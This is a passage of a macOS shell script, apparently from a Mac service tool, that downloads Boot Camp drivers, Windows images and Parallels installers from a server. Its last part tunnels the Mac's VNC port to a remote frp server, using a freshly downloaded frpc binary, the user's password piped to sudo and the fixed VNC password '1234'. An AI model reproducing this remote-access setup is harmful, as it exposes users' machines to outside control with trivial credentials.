devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
size=$kjdx"000000000"
new_hfs_size="$(($hfs_size-$size))b"
    
    tarbc="1"
	ipbc="1"
	if [[ $modelxh = "10.10"* ]];then
	if [[ $modelbb = *"MacBook8,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3	
	fi
	if [[ $modelbb = *"MacBookAir7,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3	
	fi
	if [[ $modelbb = *"MacBookPro12,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3	
	fi
	if [[ $modelbb = *"MacBookPro11,4"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3	
	fi
	if [[ $modelbb = *"MacBookPro11,5"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3	
	fi
	fi
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
    if [ "$sip" ]; then
    url="$ip8/BootCamp/2012Air.zip"
	else
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
    fi
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
    if [ "$sip" ]; then
    url="$ip8/BootCamp/2012Air.zip"
	else
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
    fi
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir4,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookPro10,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "MacBookPro10,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookPro9,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "MacBookPro9,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookPro8,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "MacBookPro8,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "MacBookPro8,3" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "iMac12,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else		
	if [[ $modelbb = "iMac12,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else		
	if [[ $modelbb = "iMac13,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "iMac13,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "iMac14,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "iMac14,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "iMac14,3" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "iMac14,4" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "iMac15,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "iMac16,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else		
	if [[ $modelbb = "iMac16,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "iMac17,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "iMac18,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "iMac18,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "iMac18,3" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "iMac19,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "iMac19,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3
	else	
	if [[ $modelbb = "Macmini6,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "Macmini6,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "Macmini7,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "Macmini5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "Macmini5,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "MacPro5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else		
	
	
	
	
	if [[ $modelxh = "10.10"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelxh = "10.9"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else
	if [[ $modelxh = "10.8"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelxh = "10.7"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3
	else	
	if [[ $modelxh = "10.6"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu3	
	
	
	
	else
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu3	
		
		
	fi	
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi	

if [ "$sxt77" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
size=$kjdx"000000000"
new_hfs_size="$(($hfs_size-$size))b"


	DrvWin7="1"
	if [ "$btap" ]; then
 	name="BootCamp$btap.zip"
	url="$ip8/BootCamp/BootCamp$btap.zip"
	else
 	name="BootCamp4.0.4033.zip"
	url="$ip8/BootCamp/BootCamp4.0.4033.zip"
    fi
    xtname3="7x64.dmg"
	name2="7x64.dmg"
	url2="$ip8/666/7x64_104.img.gz"
	FenQu3
	fi
			 
if [ "$sxt88" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi	
	
	if [[ $modelbb = "MacBookAir7,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu3
	else
	if [[ $modelbb = "MacBook8,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu3
	else
	if [[ $modelbb = "MacBook9,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6427.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir7,2" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir6,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir6,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else	
	if [[ $modelbb = "MacBookPro11,4" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu3
	else
	if [[ $modelbb = "MacBookPro11,5" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu3
	else
	if [[ $modelbb = "MacBookPro12,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu3
	else
	if [[ $modelbb = "MacBookPro11,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookPro11,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "MacBookPro11,3" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "iMac16,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "iMac16,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "iMac17,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "iMac15,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "iMac14,4" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5722.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "iMac14,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "iMac14,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else
	if [[ $modelbb = "Macmini7,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5769.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
	else



	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu3
fi		
fi	
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi	
fi
fi
fi
fi
fi
fi
fi			
fi

if [ "$ydxf" ]; then
ydxf="1"
HBFQ
fi

if [ "$azqdq" ]; then
azqdq="1"
M1Arm
fi

if [ "$pd18sq" ]; then
xnjaz="1"
pd18sq="1"
name="ParallelsDesktop-18.0.1-53056.dmg"
url="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
Download
fi

if [ "$pd17sq" ]; then
xnjaz="1"
pd17sq="1"
name="ParallelsDesktop-17.1.2-51548.dmg"
url="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
Download
fi

if [ "$pd16sq" ]; then
xnjaz="1"
pd16sq="1"
name="ParallelsDesktop-16.5.1-50696.dmg"
url="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
Download
fi

if [ "$SCPD" ]; then
rm -rf "/tmp/"$bjsbm".sh"
rm -rf "/tmp/"$bjsbm"1.sh"	
SCXNJ="1"
SCPD="1"
HBFQ
fi


if [ "$vncyc" ]; then
clear && printf "\e[3J"
echo "[common]" >/tmp/$vncip.ini
echo "server_addr = $ftpip" >>/tmp/$vncip.ini
echo "server_port = 26534" >>/tmp/$vncip.ini
echo " " >>/tmp/$vncip.ini
echo "[vnc"$vncip"]" >>/tmp/$vncip.ini
echo "type = tcp" >>/tmp/$vncip.ini
echo "local_ip = 127.0.0.1" >>/tmp/$vncip.ini
echo "local_port = 5900" >>/tmp/$vncip.ini
echo "remote_port = $vncip" >>/tmp/$vncip.ini
echo "use_encryption=true" >>/tmp/$vncip.ini
echo "use_compression=true" >>/tmp/$vncip.ini
echo
if [ "$oldvn" ]; then
curl -# -C - --connect-timeout 10 -o /tmp/frpc.zip --retry 5 "$osip/frpcold.zip"
else	
curl -# -C - --connect-timeout 10 -o /tmp/frpc.zip --retry 5 "$osip/frpc.zip"
fi
unzip -o "/tmp/frpc.zip" -d "/tmp">/dev/null 2>&1
pdpmgx=$(echo "$pass" | sudo -S sudo launchctl list com.apple.screensharing) >/dev/null 2>&1
clear && printf "\e[3J"
pdpmgxx=$(echo "$pdpmgx" | grep "true")
if [ ! "$pdpmgxx" ]; then
if [ ! "$dkpm" ]; then
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setreqperm -reqperm yes >/dev/null 2>&1
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw 1234 >/dev/null 2>&1
osascript -e 'quit app"System Preferences"'
killall "System Preferences" >/dev/null 2>&1
open "x-apple.systempreferences:com.apple.preferences.sharing"
osascript -e 'Tell application "System Events" to display dialog "点OK，然后打开【屏幕共享】！" buttons {"OK"}'
open "x-apple.systempreferences:com.apple.preferences.sharing"
else
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setreqperm -reqperm yes >/dev/null 2>&1
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setvnclegacy -vnclegacy yes -setvncpw -vncpw 1234 >/dev/null 2>&1
if [ ! "$oldvnn" ]; then
echo "$pass" | sudo -S sudo defaults write /var/db/launchd.db/com.apple.launchd/overrides.plist com.apple.screensharing -dict Disabled -bool false >/dev/null 2>&1
echo "$pass" | sudo -S sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist >/dev/null 2>&1
else
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users admin -privs -all -restart -agent -menu >/dev/null 2>&1
echo "$pass" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setreqperm -reqperm yes >/dev/null 2>&1
